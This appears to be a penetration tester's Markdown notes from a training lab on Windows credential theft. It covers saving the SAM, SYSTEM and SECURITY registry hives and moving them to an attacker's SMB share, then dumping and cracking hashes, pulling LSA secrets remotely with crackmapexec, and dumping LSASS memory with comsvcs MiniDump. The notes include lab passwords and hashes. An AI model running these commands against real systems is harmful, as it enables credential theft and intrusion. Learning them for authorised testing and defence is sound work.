- [Attacking SAM](#attacking-sam)
- [Attacking LSASS](#attacking-lasass)





![Screenshot_8](https://github.com/kiro6/penetration-testing-notes/assets/57776872/23757489-37b1-41f2-82f3-70be69c26b8f)





## Attacking SAM

1) **Copying SAM Registry Hives**

| Registry Hive | Description                                                                                                        |
|---------------|--------------------------------------------------------------------------------------------------------------------|
| hklm\sam      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| hklm\system   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                      |
| hklm\security | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                               |


```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```



2) **Creating a Share with smbserver.py**

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```cmd
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

3) **Dumping Hashes with Impacket's secretsdump.py**


```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

4) **Cracking Hashes with Hashcat**

```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```


### Dumping LSA Secrets Remotely
```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
SMB         10.129.42.198   445    WS01     [+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01\worker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
```

### Dumping SAM Remotely

```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198   445    WS01      [+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
```

## Attacking LSASS

### Dumping LSASS Process Memory

#### Task Manager Method
```
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

A file called lsass.DMP is created and saved in:  C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
#### Rundll32.exe & Comsvcs.dll Method

```powershell

Get-Process lsass

rundll32 C:\windows\system32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full 
```
```cmd

tasklist /svc | findstr lsass

rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full
```

### Using Pypykatz to Extract Credentials
[pypykatz](https://github.com/skelsec/pypykatz)

```bash
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
#### MSV
MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. 
```
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

#### WDIGEST
WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text
```
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

#### Kerberos
```
== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

#### DPAPI
Mimikatz and Pypykatz can extract the DPAPI masterkey for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI
```
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

| Application              | Use of DPAPI                                            |
|--------------------------|---------------------------------------------------------|
| Internet Explorer        | Password form auto-completion data (username and password for saved sites).  |
| Google Chrome            | Password form auto-completion data (username and password for saved sites).  |
| Outlook                  | Passwords for email accounts.                            |
| Remote Desktop Connection| Saved credentials for connections to remote machines.    |
| Credential Manager       | Saved credentials for accessing shared resources, joining wireless networks, VPNs, and more. |
